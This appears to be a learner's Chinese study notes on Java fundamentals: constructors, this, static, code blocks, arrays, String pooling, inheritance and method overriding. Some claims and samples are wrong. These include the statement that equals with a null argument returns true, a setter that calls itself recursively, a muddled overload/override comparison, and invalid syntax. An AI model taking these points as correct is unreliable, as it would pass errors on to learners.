注意：Java中构造方法是类中默认提供的，不写即为无参，编译自动创建，如果有构造方法，默认的构造方法不会创建。对于为什么构造方法不能用void返回，因为Java程序编译器是根据代码结构来进行编译，如果加void，那么与普通方法的代码结构完全一致了，而普通方式是在实例化对象之后才调用的，构造方法是在实例时调用的（new时）。\n​    构造方法也是方法，可以重载。\n​    之前封装属性的时候我们用setter方法，setter和构造方法都具有初始化属性的功能。而setter还具有修改数据的功能。\n​    下面这段代码就是匿名对象了：\nClass Person&#123;  private String name;  private int age;  public Person(String s,int i)&#123;    name = s；    age = i；  &#125;  public void tell()&#123;    sout(&quot;姓名： &quot;+name+&quot;、年龄： &quot;+ age);  &#125;&#125;public class Test &#123;  psvm&#123;\t\tnew Person(&quot;张三&quot;,10).tell()  &#125;&#125;\n\n​    此方法依然可以完成方法的调用，但在使用完后即被释放，垃圾随机会被GC回收。\n\nthis关键字​    this可实现以下三类结构的描述：\n​    1、当前类中的属性：this.属性；\n​    2、当前类中的方法(普通方法、构造方法)：this()、this.方法名称()；\n​    3、描述当前对象\n1、this调用当前类中属性​    我们现在利用构造方法或者是setter方法都可以进行类中属性的赋值，代码如下\npublic Person(String n,int a)&#123;  name = n;  age = a;&#125;\n\n​    此时构造方法中两个参数的目的是为了类中的name,age赋值，但n和a的参数名称很不好，我们将其修改为name和age\npublic Person(String name,int age)&#123;  name = name;  age = age;&#125;\n\n​    执行的时候会发现报错，无法正确进行属性设置。在Java程序中{}是一个结构体的边界福，那么在程序里面设置变量（参数、属性）使用的时候都以{}作为一个查找边界，按照就近取用原则，此时的构造方法并没有能够访问类中的属性，所以此时为了明确类中的属性与参数的区别，往往会在属性前追加this，表示本类的属性。\npublic Person(String name,int age)&#123;  this.name = name;  this.age = age;&#125;\n\n​    在实际的开发过程中，只要是访问本类的属性，请加上”this”！\n2、this调用类中方法​    对于方法的调用分构造方法和普通方法：\n​    构造方法调用（this()）：使用关键字new的时候才会调用构造方法；\n​    普通方法调用（this.方法名称()）:实例化对象产生之后就可以调用普通方法。\n//\t调用类中的普通方法：Class Person &#123;  private String name;  private int age;  public Person(String name,int age)&#123;    this.name = name;    this.age = age;  &#125;  public void tell()&#123;    system.out.println(&quot;姓名： &quot;+ this.name + &quot;年龄： &quot;+this.age);  &#125;  public void setName(String name)&#123;    this.setName(name);    //setName(name);加和不加一样的，建议加上  &#125;  public void SetAge(int age)&#123;    this.age = age;  &#125;  public String getName()&#123;    return this.name;  &#125;  public int getAge()&#123;\t\treturn this.age;\t  &#125;&#125;public class Test &#123;\tpublic static void main(String args[])&#123;    Person per = new Person(&quot;小华&quot;,30);    per.tell();  &#125;&#125;\n\n​    对于构造方法的调用，放在构造方法里执行。看下面一个例子：\n​    假设类中一共定义三个构造方法，但是要求不管调用哪个构造方法，都执行一行输出语句“一个新的类的对象实例化”。\n传统做法：    \nClass Person &#123;  private String name;  private int age;  public Person()&#123;    system.out.println(&quot;一个新的类的对象实例化&quot;);  &#125;  public Person(String name)&#123;    system.out.println(&quot;一个新的类的对象实例化&quot;);    this.name = name;  &#125;  public Person(String name,int age)&#123;\t\tsystem.out.println(&quot;一个新的类的对象实例化&quot;);    this.name = name;    this.age = age;  &#125;  public void tell()&#123;    system.out.println(&quot;姓名： &quot;+ this.name + &quot;年龄： &quot;+this.age);  &#125;&#125;public class Test &#123;\tpublic static void main(String args[])&#123;    Person per = new Person(&quot;小华&quot;,30);    per.tell();  &#125;&#125;\n\n使用this：\nClass Person &#123;  private String name;  private int age;  public Person()&#123;    system.out.println(&quot;一个新的类的对象实例化&quot;);  &#125;  public Person(String name)&#123;    this();//调用无参    this.name = name;  &#125;  public Person(String name,int age)&#123;\t\tthis(name);//调用单参    this.age = age;  &#125;  public void tell()&#123;    system.out.println(&quot;姓名： &quot;+ this.name + &quot;年龄： &quot;+this.age);  &#125;&#125;public class Test &#123;\tpublic static void main(String args[])&#123;    Person per = new Person(&quot;小华&quot;,30);    per.tell();  &#125;&#125;\n\n​    对于本类构造方法的相互调用需要注意以下几点重要问题！\n​    1、构造方法必须在实例化新对象的时候调用，所以“this（）”的语句只允许放在构造方法的首行。\n​    2、构造方法相互调用时请保留程序的出口，不要死循环。\n\n简单Java类的结构​    1、类名称一定要有意义。\n​    2、类之中的所有属性都必须使用private进行封装，同时封装后的属性必须要提供setter、getter方法。\n​    3、类之中可以提供无数多个构造方法，但是必须要保留有无参构造方法。\n​    4、类之中不允许出现任何输出语句，获取内容必须返回。\n​    ps.在进行类的设计的时候，如果发现类中没有属性存在的意义，那么就没必要使用普通方法，因为普通方法需要实例化对象才可以调用。\n\nStatic关键字1、Static定义属性（公共属性）​    一个类中，属性一旦被定义实际上内容都交给各自的堆内存空间进行保存。在内存中，会有一个全局数据区域，来存储被static关键字修饰的属性。\n\n​    由于static是一个公共属性，虽然可以通过对象进行访问，但规范上应该通过类进行访问，所以static属性可以由类名称直接调用。\n​    static属性虽然定义在类中，但是其并不收到实例化对象的控制。static属性可以在没有实例化对象的时候使用。\n​    在进行类设计的时候首选的一定是非static属性（大部分），公共信息存储采用static。\n2、Static定义方法​    static方法和static属性形同，主要特点在于，可以直接由类名称在没有实例化对象的情况下调用。\n​    对于程序而言，方法有了两种：static方法和非static方法，调用就有了限制：\n​    1、static方法只允许调用static属性或static方法。\n​    2、非static方法允许调用static方法属性或static方法。\n例子：    \nclass Book &#123;  private String title；  private static int count = 0；  public Book(String title)&#123;    this.title = title;    count++;    System.out.println(&quot;第&quot; + count + &quot;本图书创建出来&quot;);  &#125;&#125;public class Test&#123;  public static void main(String args[])&#123;    new Book(&quot;Java&quot;);    new Book(&quot;JSP&quot;);    new Book(&quot;Spring&quot;);  &#125;&#125;\n\n//实现一个没名字自动命名class Book &#123;  private String title；  private static int count = 0；  public Book()&#123;    this(&quot;NOTITLE - &quot; + count ++)  &#125;  public Book(String title)&#123;    this.title = title;  &#125;  public String getTitle()&#123;    return this.title;  &#125;&#125;public class Test&#123;  public static void main(String args[])&#123;\t\tSystem.out.println(new Book(&quot;Java&quot;).getTitle());    System.out.println(new Book(&quot;JSP&quot;).getTitle());    System.out.println(new Book(&quot;Spring&quot;).getTitle());    System.out.println(new Book().getTitle());    System.out.println(new Book().getTitle());  &#125;&#125;\n\n\n代码块​    ps.到了这里算是结构上的东西了，为什么特意提一嘴的，因为我记得在学习CC1的时候（很早以前了都忘完了😭，后面基础完了会陆续再继续写），就专门有静态代码块发生作用的时候了。系列还是以Java安全为主的，所以对于语言的细节真的很重要。\n​    使用{}定义的就是代码块，根据位置不同以及定义的关键字不同，代码块可以分为普通代码块、构造代码块、静态代码块、同步代码块。\n普通代码块​    普通代码块的主要特点是定义在一个方法之中的代码块。可以在一个方法之中进行一些结构的拆分，以防止相同变量名称所带来的影响。\npublic class Test&#123;  public static void main(String args[])&#123;    if(true)&#123;      int x = 10;      System.out.println(&quot;x = &quot; + x);    &#125;    int x = 100;    System.out.println(&quot;x = &quot;+ x);  &#125;&#125;\n\n构造代码块​    定义在一个类之中的。\nclass Person &#123;  public Person()&#123;    System.out.println(&quot;【构造方法】Person类构造方法执行&quot;);  &#125;  &#123;    System.out.println(&quot;【构造块】Person构造块执行&quot;);  &#125;&#125;public class Test&#123;  public static void main(String args[])&#123;    new Person();    new Person();    new Person();  &#125;&#125;\n\n​    构造块会优先于构造方法执行，并且每一次实例化新对象的时候都会调用构造块中的内容。\n静态代码块​    指的是用static关键字定义的代码块。静态块的定义需要考虑两种情况:\n​    1、非主类中进行静态块的定义\nclass Person &#123;  public Person()&#123;    System.out.println(&quot;【构造方法】Person类构造方法执行&quot;);  &#125;  static &#123;    System.out.println(&quot;【静态块】静态块执行&quot;);  &#125;  &#123;    System.out.println(&quot;【构造块】Person构造块执行&quot;);  &#125;&#125;public class Test&#123;  public static void main(String args[])&#123;    new Person();    new Person();    new Person();  &#125;&#125;\n\n\n​    可以发现静态代码块会优先于构造块执行，不管有多少个实例化对象出现静态代码块都只会出现一次，此代码块的目的是为了静态属性初始化。\n​    2、在主类中进行静态代码块的定义\n​    静态代码块优先于主方法执行。\n\n总结一​    写出以下几个类：\n​    1、写一个代表地址的Address类，地址信息由国家、省份、城市、街道、邮编组成，并可返回完整的地址信息。\nclass Address &#123;    private String country;    private String province;    private String city;    private String street;    private int zipcode;    public Address() &#123;    &#125;    public Address(String country, String province, String city, String street, int zipcode) &#123;        this.country = country;        this.province = province;        this.city = city;        this.street = street;        this.zipcode = zipcode;    &#125;    public void setCountry(String country) &#123;        this.country = country;    &#125;    public void setProvince(String province) &#123;        this.province = province;    &#125;    public void setCity(String city) &#123;        this.city = city;    &#125;    public void setStreet(String street) &#123;        this.street = street;    &#125;    public void setZipcode(int zipcode) &#123;        this.zipcode = zipcode;    &#125;    public String getCity() &#123;        return city;    &#125;    public String getCountry() &#123;        return country;    &#125;    public String getProvince() &#123;        return province;    &#125;    public String getStreet() &#123;        return street;    &#125;    public int getZipcode() &#123;        return zipcode;    &#125;    public String getInfo() &#123;        return &quot;国家： &quot; + this.country + &quot;省份： &quot; + this.province + &quot;街道： &quot; + this.street + &quot;城市： &quot; + this.city + &quot;邮编： &quot; + this.zipcode;    &#125;&#125;public class Test1 &#123;    public static void main(String[] args) &#123;        System.out.println(new Address(&quot;中国&quot;, &quot;北京&quot;, &quot;天安门&quot;, &quot;北京&quot;, 10001).getInfo());    &#125;&#125;\n\n​    2、一个员工类，属性包括“编号”，“姓名”，“基本薪资”，“薪水增长率”，包括计算薪水增长额及操作方法。\nclass Employee&#123;    private long empno;    private String ename;    private double salary;    private double rate;    public Employee()&#123;&#125;    public Employee(long empno, String ename, double salary, double rate) &#123;        this.empno = empno;        this.ename = ename;        this.salary = salary;        this.rate = rate;    &#125;    public double salaryIncValue()&#123;        return this.salary * this.rate;    &#125;    public double salaryIncResult()&#123;        this.salary = this.salary * (1+this.rate);        return this.salary;    &#125;    public String getInfo()&#123;        return &quot;雇员编号： &quot; + this.empno+&quot;、雇员姓名： &quot;+this.ename+&quot;、基本薪资： &quot;+this.salary+&quot;、增长率： &quot;+this.rate;    &#125;&#125;public class Test2 &#123;    public static void main(String[] args) &#123;        Employee emp = new Employee(7369L,&quot;小华&quot;,3000.0,0.3);        System.out.println(emp.getInfo());        System.out.println(&quot;工资调整额度:&quot; + emp.salaryIncValue());        System.out.println(&quot;上调后工资：&quot;+emp.salaryIncResult());    &#125;&#125;\n\n\n数组数组定义​    数组的动态初始化（初始化之后数组每一个元素的保存内容为其对应数据类型的默认值）：\n​    声明并初始化数组：\n​        1、数据类型 数组名称[] = new 数据类型[长度]；\n​        2、数据类型[] 数组名称 = new 数据类型[长度]；\n​    数组的静态初始化（在数组定义的时候就为其设置好了里面的内容）：\n​        简化格式：数据类型 数组名称[] = {1,2,3};\n​        完整格式：数据类型 数组名称[] = new 数据类型[] {1,2,3};\n数组的引用传递​    内存分析和上面的对象内存分析一样。注意下必须实例化对象后才可以使用下标进行操作即可，因为只有实例化后才会在堆内存里开辟内存空间。\n二维数组​    和一维数组一样，加个括号\n数组与方法​    \n数组相关类库​    java.util.Arrays.sort(date);//排序\n​    System.arraycopy(源数组,源开始店，目标，目标开始店，拷贝长度)\n方法可变参数class ArrayUtil&#123;\tpublic static int sum(int ... data)&#123;\t\tint sum = 0;\t\tfor (int temp:data)&#123;\t\t\tsum += temp;\t\t&#125;\t\treturn sum;\t&#125;&#125;public class ArrayDemo&#123;\tpublic static void main(String[] args)&#123;\t\tSystem.out.println(ArrayUtil.sum(1,2,3));\t\tSystem.out.println(ArrayUtil.sum(1,2,3,4));\t&#125;&#125;\n\n​    在以后进行程序类设计或者开发者调用的时候，可以自定义参数的个数，需要清楚本质是数组。\n对象数组​    定义的格式和数组定义是一样的，只是格式换成了类。\nPerson per [] = new Person[3];//对象数组per[0] = new Person(&quot;张三&quot;,20);per[1] = new Person(&quot;李四&quot;,20);per[2] = new Person(王五,20);\n\n​    \n\n引用传递实际应用类关联结构class Car &#123;    private String name;    private double price;    private Person1 person1;    public Car(String name, double price) &#123;        this.name = name;        this.price = price;    &#125;    public void setPerson1(Person1 person1) &#123;        this.person1 = person1;    &#125;    public Person1 getPerson1() &#123;        return person1;    &#125;    public String getInfo() &#123;        return &quot;汽车品牌型号： &quot; + this.name + &quot;、汽车价值： &quot; + this.price;    &#125;&#125;class Person1 &#123;    private String name;    private int age;    private Car car;    public Person1(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public void setCar(Car car)&#123;        this.car = car;    &#125;    public Car getCar() &#123;        return car;    &#125;    public String getInfo() &#123;        return &quot;姓名： &quot; + this.name + &quot;、年龄： &quot; + this.age;    &#125;&#125;public class yinyongchuandi &#123;    public static void main(String[] args) &#123;        Person1 person1 = new Person1(&quot;林强&quot;,29);        Car car = new Car(&quot;宾利&quot;,8000000);        person1.setCar(car);        car.setPerson1(person1);        System.out.println(person1.getCar().getInfo());        System.out.println(car.getPerson1().getInfo());    &#125;&#125;\n\n自身关联class Car &#123;    private String name;    private double price;    private Person1 person1;    public Car(String name, double price) &#123;        this.name = name;        this.price = price;    &#125;    public void setPerson1(Person1 person1) &#123;        this.person1 = person1;    &#125;    public Person1 getPerson1() &#123;        return person1;    &#125;    public String getInfo() &#123;        return &quot;汽车品牌型号： &quot; + this.name + &quot;、汽车价值： &quot; + this.price;    &#125;&#125;class Person1 &#123;    private String name;    private int age;    private Car car;    private Person1 children[];    public Person1(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public void setChildren(Person1[] children) &#123;        this.children = children;    &#125;    public Person1[] getChildren() &#123;        return children;    &#125;    public void setCar(Car car) &#123;        this.car = car;    &#125;    public Car getCar() &#123;        return car;    &#125;    public String getInfo() &#123;        return &quot;姓名： &quot; + this.name + &quot;、年龄： &quot; + this.age;    &#125;&#125;public class yinyongchuandi &#123;    public static void main(String[] args) &#123;        Person1 person1 = new Person1(&quot;林强&quot;, 29);        Person1 childA = new Person1(&quot;child1&quot;, 18);        Person1 chileb = new Person1(&quot;child2&quot;, 19);        childA.setCar(new Car(&quot;BMW&quot;, 3000000));        chileb.setCar(new Car(&quot;farali&quot;, 1500000));        person1.setChildren(new Person1[]&#123;childA, chileb&#125;);        Car car = new Car(&quot;宾利&quot;, 8000000);        person1.setCar(car);        car.setPerson1(person1);        System.out.println(person1.getCar().getInfo());        System.out.println(car.getPerson1().getInfo());        for (int x = 0; x &lt; person1.getChildren().length; x++) &#123;            System.out.println(&quot;\\t|-&quot; + person1.getChildren()[x].getInfo());            System.out.println(&quot;\\t\\t|-&quot; + person1.getChildren()[x].getCar().getInfo());        &#125;    &#125;&#125;\n\n合成设计模式class 电脑&#123;    private 显示器 对象数组[];    private 主机 主机;&#125;class 显示器&#123;&#125;class 主机&#123;    private 主板 对象;    private 鼠标 对象1;    private 键盘 对象2;&#125;class 主板&#123;    private 内存 对象数组 [];    private CPU 对象数组1[];    private 显卡 对象;    private 硬盘 对象数组2[];&#125;class 键盘&#123;&#125;class 鼠标&#123;&#125;class 内存&#123;&#125;class CPU&#123;&#125;class 显卡&#123;&#125;class 硬盘&#123;&#125;\n\n​    每一个都可以拆分，然后再重新组合\n\n数据表与简单Java类映射转换​    开发中基本上是由数据表来定义简单Java类。其基本关系如下：\n​    1、数据实体表设计 = 类的定义；\n​    2、表中的字段 = 类的成员属性；\n​    3、表的一行记录 = 表的一个实例化对象；\n​    4、表的多行记录 = 对象数组；    \n​    5、表的外键 = 引用关联；\nclass Member &#123;    private String mid;    private String name;    private Role roles[];    public Member(String mid, String name) &#123;        this.mid = mid;        this.name = name;    &#125;    public void setRoles(Role roles[]) &#123;        this.roles = roles;    &#125;    public Role[] getRoles() &#123;        return this.roles;    &#125;    public String getInfo() &#123;        return &quot;【用户信息】mid= &quot; + this.mid + &quot;、name = &quot; + this.name;    &#125;&#125;class Role &#123;    private long rid;    private String title;    private Member members[];    private Privilege privileges[];    public Role(long rid, String title) &#123;        this.rid = rid;        this.title = title;    &#125;    public Member[] getMembers() &#123;        return this.members;    &#125;    public void setMembers(Member[] members) &#123;        this.members = members;    &#125;    public Privilege[] getPrivileges() &#123;        return this.privileges;    &#125;    public void setPrivileges(Privilege[] privileges) &#123;        this.privileges = privileges;    &#125;    public String getInfo() &#123;        return &quot;【角色信息】rid = &quot; + this.rid + &quot;、title = &quot; + this.title;    &#125;&#125;class Privilege &#123;    private long pid;    private String title;    public void setRole(Role role) &#123;        this.role = role;    &#125;    public Role getRole() &#123;        return role;    &#125;    private Role role;    public Privilege(long pid, String title) &#123;        this.pid = pid;        this.title = title;    &#125;    public String getInfo() &#123;        return &quot;【权限信息】pid = &quot; + this.pid + &quot;、Privilege = &quot; + this.title;    &#125;&#125;public class Test4 &#123;    public static void main(String[] args) &#123;        Member memA = new Member(&quot;a&quot;, &quot;张三&quot;);        Member memB = new Member(&quot;b&quot;, &quot;李四&quot;);        Role roleA = new Role(1L, &quot;系统服务&quot;);        Role roleB = new Role(2L, &quot;备份服务&quot;);        Role roleC = new Role(3L, &quot;人事管理&quot;);        Privilege priA = new Privilege(1000L, &quot;系统初始化&quot;);        Privilege priB = new Privilege(1001L, &quot;系统环境还原&quot;);        Privilege priC = new Privilege(1002L, &quot;系统环境修改&quot;);        Privilege priD = new Privilege(2000L, &quot;备份员工数据&quot;);        Privilege priE = new Privilege(2001L, &quot;备份部分数据&quot;);        Privilege priF = new Privilege(2002L, &quot;备份公文数据&quot;);        Privilege priG = new Privilege(3000L, &quot;增加员工&quot;);        Privilege priH = new Privilege(3001L, &quot;编辑员工&quot;);        Privilege priI = new Privilege(3002L, &quot;浏览员工&quot;);        Privilege priJ = new Privilege(3003L, &quot;员工离职&quot;);        //增加角色和权限        roleA.setPrivileges(new Privilege[]&#123;priA, priB, priC&#125;);        roleB.setPrivileges(new Privilege[]&#123;priD, priE, priF&#125;);        roleC.setPrivileges(new Privilege[]&#123;priG, priH, priI, priJ&#125;);        //增加权限与角色对应        priA.setRole(roleA);        priB.setRole(roleA);        priC.setRole(roleA);        priD.setRole(roleB);        priE.setRole(roleB);        priF.setRole(roleB);        priG.setRole(roleC);        priH.setRole(roleC);        priI.setRole(roleC);        priJ.setRole(roleC);        //增加用户与角色的对应关系        memA.setRoles(new Role[]&#123;roleA, roleB&#125;);        memB.setRoles(new Role[]&#123;roleA, roleB, roleC&#125;);        roleA.setMembers(new Member[]&#123;memA, memB&#125;);        roleB.setMembers(new Member[]&#123;memA, memB&#125;);        roleC.setMembers(new Member[]&#123;memB&#125;);        System.out.println(&quot;---通过用户查看信息---&quot;);        System.out.println(memB.getInfo());        for (int x = 0; x &lt; memB.getRoles().length; x++) &#123;            System.out.println(&quot;\\t|- &quot; + memB.getRoles()[x].getInfo());            for (int y = 0; y &lt; memB.getRoles()[x].getPrivileges().length; y++) &#123;                System.out.println(&quot;\\t\\t|-&quot; + memB.getRoles()[x].getPrivileges()[y].getInfo());            &#125;        &#125;        System.out.println(&quot;---通过角色查看信息---&quot;);        System.out.println(memB.getInfo());        System.out.println(&quot;\\t|- 浏此次角色下的所有权限信息：&quot;);        for (int x = 0; x &lt; roleB.getPrivileges().length; x++) &#123;            System.out.println(&quot;\\t\\t|- &quot; + roleB.getPrivileges()[x].getInfo());        &#125;        System.out.println(&quot;\\t|- 浏览此角色下的所有用户信息： &quot;);        for (int x = 0; x &lt; roleB.getMembers().length; x++) &#123;            System.out.println(&quot;\\t\\t|- &quot; + roleB.getMembers()[x].getInfo());        &#125;        System.out.println(&quot;---通过权限查看信息---&quot;);        System.out.println(priA.getInfo());        for (int x = 0; x &lt; priA.getRole().getMembers().length;x++)&#123;            System.out.println(&quot;\\t| &quot;+ priA.getRole().getMembers()[x].getInfo());        &#125;    &#125;&#125;\n\n\nString类特点分析String简介​    JDK1.8以前String保存的是字符数组，JDK1.9以后String保存的是字节数组。\n​    1.8:private final char value[]\n​    1.9:private final byte value[]\n​    字符串是对数组的一种包装应用，所以无法改变里面的内容。\n​    Sting可以直接赋值，也可以是使用构造方法赋值。\n​    String str = new String(“test”);\nString比较​    ==进行的是数值比较，用在对象上是比较内存空间的地址。\n​    内容比较需要用equals，strA.equals(strB)。\n​    equals方法里提供有一个可以回避null的功能，需要把字符串对象写在前面\n​    如果strb=null，stra.equals(strb)，结果为true。\n字符串常量​    使用“”定义的其实是一个String类的匿名对象。\nString类对象两种实例化方式比较1、直接赋值实例化String strA = &quot;test&quot;;String strB = &quot;test&quot;;System.out.println(strA == strB);\n\n​    结果为true，之所以出现这样的原因是Java程序底层里有一个字符串池。在strA在堆内存中产生数值后，会把这个数值方法池中（也在堆内存里），然后strB创建时，会在池中查找有没有test，有的话直接指向。那么现在，即使是==判断地址，也是true了。\n    2、构造方法实例化String str = new String(&quot;test&quot;);\n\n​    \n3、两种比较String strA = &quot;test&quot;;String strB = new String(&quot;test&quot;);System.out.println(strA == strB);//false\n\n\n​    除了以上特点外，在使用构造方法实例化String类对象时不会出现自动保存到字符串对象池里的特点。\n​    构造方法实例化对象实际上是属于一种自己专用的内存空间，但是在String类里买，也提供手工入池的方法。\nString strA = &quot;test&quot;;String strB = new String(&quot;test&quot;).intern();System.out.println(strA == strB);//true\n\n总结：​    直接赋值：创建一个实例化对象，并且可以自动保存到对象池之中，以实现该字符串实例的重用。\n​    构造方法：会产生两个实例化对象，并且不会自动入池，无法实现对象重用，但可手工入池。\nString对象（常量）池​    对象池的主要目的是实现数据的共享处理。以String对象池为例，里面的内容是为了重用。Java中对象（常量）池可以分为两种；\n1、静态常量池：​        程序（*.class）在加载的时候会自动将此程序之中保存的字符串、普通的常量、类和方法的信息等等，全部进行分配。\nString strA = &quot;test1w&quot;;String strB = &quot;test&quot;+&quot;1w&quot;;System.out.println(strA == strB);//true\n\n2、运行时常量池：​        当一个程序(*.class)加载之后，里面可能有一些变量例如用户输入等等，这个时候提供的常量池。\nString info = &quot;1w&quot;String strA = &quot;test1w&quot;;String strB = &quot;test&quot; + info;System.out.println(strA == strB);//false\n\n字符串内容不可修改    \n​    String类不要在开发频繁修改，因为会产生大量垃圾空间。\nJava中的主方法​    public static void main(String args[])\n​    public：描述的是一种访问权限，主方法是一切的开始点，开始点一定是公共的；\n​    static：程序的执行是通过类名称完成的，所以此方法是类直接调用的；\n​    void：主方法是一切起点，一旦开始就不能返回了；\n​    main：是一个系统定义好的方法名称；\n​    String args[]：是一个字符串数组，可以实现程序启动参数的输出。\n\nString类常用方法字符串与字符数组​    处理中文一般用char。\n​    JDK1.9以前，所有的String都利用了字符数组实现了包装的处理，所以在String类里有相应的转换处理方法。字符串中的索引下标都是从0开始的。\npublic class Test5 &#123;    public static void main(String[] args) &#123;        String str = &quot;helloworld&quot;;        char[] result = str.toCharArray();        for (int x = 0;x&lt;result.length;x++)&#123;            result[x] -= 32;        &#125;        String newstr = new String(result);        System.out.println(newstr);    &#125;&#125;\n\npublic class Test6 &#123;    public static void main(String[] args) &#123;        String str = &quot;helloworld&quot;;        System.out.println(isNumber(str)?&quot;由数字组成&quot;:&quot;不由数字组成&quot;);    &#125;    public  static boolean isNumber(String str)&#123;        char[] result = str.toCharArray();        for (int x= 0;x&lt; result.length;x++)&#123;            if (result[x] &lt; &#x27;0&#x27; || result[x] &gt; &#x27;9&#x27;)&#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;\n\n字符串与字节数组​    字符串与字节数字转换时，主要目的是二进制数据传输或着涉及编码转换。\n​    public byte[] getBytes(String charsetName) throws UnsupportedEncodingException涉及编码转换是最重要的方法之一。\n字符串比较​    compareTo()方法非常重要。\n字符串查找​    contain()//是否存在\n​    indexOf()//查找位置\n​    starsWith()//判断开头\n​    endsWith()//判断结尾\n字符串替换​    replaceAll()//全部替换\n​    replaceFirst()//替换首个\n字符串拆分​    split()//全部拆分\n​    split(string,2)//拆成两个\n​    特殊符号”\\\\转译”\n字符串截取​    substring()\n字符串格式化​    format()\n其他方法​    concat()，intern()，isEmpty()，trim()//去除左右空格，toUpperCase()，toLowerCase()，Java中没有首字母大写的方法，可自定义。\nimport java.util.Locale;class StringUtil &#123;    public static String initcap(String str) &#123;        if (str == null || &quot;&quot;.equals(str))&#123;            return str;        &#125;        if (str.length() == 1)&#123;            return str.toUpperCase(Locale.ROOT);        &#125;        return str.substring(0,1).toUpperCase(Locale.ROOT) + str.substring(1);    &#125;&#125;public class Test7 &#123;    public static void main(String[] args) &#123;        System.out.println(StringUtil.initcap(&quot;hello&quot;));        System.out.println(StringUtil.initcap(&quot;m&quot;));    &#125;&#125;\n\n\n继承的定义与使用继承问题引出​    继承性的主要特点：可以扩充已有类的功能。\n​    良好的代码是结构合理，利于维护，可重用行很高，如果只用之前的，不可避免面对重复性。\n​    传统定义写法，大量重复：\nclass Person2 &#123;    private String name;    private int age;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public String getName() &#123;        return this.name;    &#125;    public int getAge() &#123;        return this.age;    &#125;&#125;class Student &#123;    private String name;    private int age;    private String school;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public String getName() &#123;        return this.name;    &#125;    public int getAge() &#123;        return this.age;    &#125;    public void setSchool(String school) &#123;        this.school = school;    &#125;    public String getSchool() &#123;        return school;    &#125;&#125;\n\n继承实现​    由extends关键字完成，class 子类 extends 父类{}\n​    子类可称为派生类，父类成为超类。\n​    子类可以重用父类结构，可以定义新的内容\npackage two;class Person2 &#123;    private String name;    private int age;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public String getName() &#123;        return this.name;    &#125;    public int getAge() &#123;        return this.age;    &#125;&#125;class Student extends Person2 &#123;    private String school;    public void setSchool(String school) &#123;        this.school = school;    &#125;    public String getSchool() &#123;        return school;    &#125;&#125;public class Test8 &#123;    public static void main(String[] args) &#123;        Student stu = new Student();        stu.setName(&quot;test&quot;);        stu.setAge(30);        stu.setSchool(&quot;家里蹲&quot;);        System.out.println(&quot;姓名： &quot; + stu.getName() + &quot;年龄： &quot; + stu.getAge() + &quot;学校：&quot; + stu.getSchool());    &#125;&#125;\n\n\n子类对象实例化流程class Person4&#123;    public Person4()&#123;        System.out.println(&quot;【Person】父类实例化对象产生&quot;);    &#125;&#125;class Student2 extends Person4&#123;    public Student2()&#123;        System.out.println(&quot;【student】子类实例化对象产生&quot;);    &#125;&#125;public class Test9 &#123;    public static void main(String[] args) &#123;        new Student2();    &#125;&#125;\n\n​    结果为：\n​    【Person】父类实例化对象产生​    【student】子类实例化对象产生\n​    实例化子类，也会自动调用父类的构造方法(实例化父类对象)，默认情况下的会自动实例化父类对象。这时候相当于子类的构造方法隐含了一个super()。\n​    super()表示的就是自动调用父类构造的语句，该语句只允许放在子类构造方法的首行。并且默认情况下，子类只会调用父类中的无参构造方法，所以上例写不写super()区别不大，但是如果说父类没有无参构造，必须利用super()明确调用有参构造。\n​    super()和this都可以调用构造方法，super是由子类调用父类的构造，this是调用本类的构造，并且都要放在首行，所以不允许同时出现。\n继承相关限制​    1、Java中不允许多重继承，只允许多层继承。\n!!!!!!错误的代码，多重继承class A&#123;&#125;;class B&#123;&#125;;class C extends A,B&#123;&#125;;\n\n​    2、在进行继承操作的时候，实际上子类可以继承父类中的所有的操作结构。但是对于私有操作是隐式继承，而非私有操作属于显式继承。\nclass Person5&#123;    private String name;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;&#125;class Student3 extends Person5&#123;    public Student3(String name)&#123;        setName(name);    &#125;    public void fun()&#123;        //System.out.println(name);因为是私有的，不能操作        System.out.println(getName());//间接访问    &#125;&#125;public class Test10 &#123;    public static void main(String[] args) &#123;        Student3 stu = new Student3(&quot;test&quot;);        stu.fun();    &#125;&#125;\n\n​    子类至少会维持父类的现有功能。\n\n覆写方法覆写​    子类和父类一旦产生继承后，会继承父类全部定义，如果子类发现父类中设计不足并且需要保留有父类中的方法或者属性名称的情况下就会发生覆写。\n​    1、方法覆写\nclass Channel&#123;    public void connect()&#123;        System.out.println(&quot;【channel父类】进行资源的连接&quot;);    &#125;&#125;class DatabaseChannel extends Channel&#123;    @Override    public void connect() &#123;        System.out.println(&quot;【子类】进行数据库资源的连接&quot;);    &#125;&#125;public class Test11 &#123;    public static void main(String[] args) &#123;        DatabaseChannel channel = new DatabaseChannel();        channel.connect();    &#125;&#125;\n\n​    子类覆写之后如果想调用父类的方法，用super.方法()。\n​    只要是在子类中调用父类方法的时候一定要在方法前追加有”super”。\n方法覆写限制​    被覆写的方法不能拥有比父类方法更严格的访问控制权限。\n​    public&gt;default(不写)&gt;private，如果父类用defautle定义，子类只能用public或者default定义，父类用public定义，子类只能用public定义。\n​    private问题：\nclass Channel&#123;    private void connect()&#123;        System.out.println(&quot;【channel父类】进行资源的连接&quot;);    &#125;    public void fun()&#123;        this.connect();    &#125;&#125;class DatabaseChannel extends Channel&#123;    //此时并不是一个覆写，因为父类的connetc方法不可见，此时相当于一个新的方法！    public void connect() &#123;        System.out.println(&quot;【子类】进行数据库资源的连接&quot;);    &#125;&#125;public class Test11 &#123;    public static void main(String[] args) &#123;        DatabaseChannel channel = new DatabaseChannel();        channel.fun();    &#125;&#125;\n\nOverride与Overloading的区别：​    Overloading是重载，Override是覆写。Overloading方法名称相同，参数的名称和个数不同，Override方法名称参数类型及个数返回值不同；Overloading没有权限限制，Overloading被覆写方法不能拥有更严格的控制权限；Overloading发生在一个类中，Override发生在重载关系类中。\n​    在进行方法重载时，不限制返回类型，但原则上应该保持一致。\n属性覆盖​    当子类定义了与父类相同名称的成员时候就称为属性覆盖。\nfinal关键字​    final描述的是终结器的概念，可实现一下功能\n​    1、定义不能够被继承的类、不能够被覆写的方法、常量。\n​    